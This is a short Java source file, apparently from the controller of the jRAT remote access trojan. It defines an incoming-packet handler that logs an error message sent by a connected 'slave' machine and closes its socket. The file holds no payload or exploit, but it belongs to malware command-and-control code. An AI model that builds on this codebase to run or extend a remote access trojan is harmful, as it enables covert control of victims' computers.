package jrat.controller.packets.incoming;

import jrat.controller.LogAction;
import jrat.controller.Main;
import jrat.controller.Slave;
import jrat.controller.exceptions.CloseException;

import java.io.DataInputStream;


public class Packet60Error extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String reason = slave.readLine();

		Main.instance.getPanelLog().addEntry(LogAction.ERROR, slave, reason);

		slave.closeSocket(new CloseException("Error packet: " + reason));
	}

}
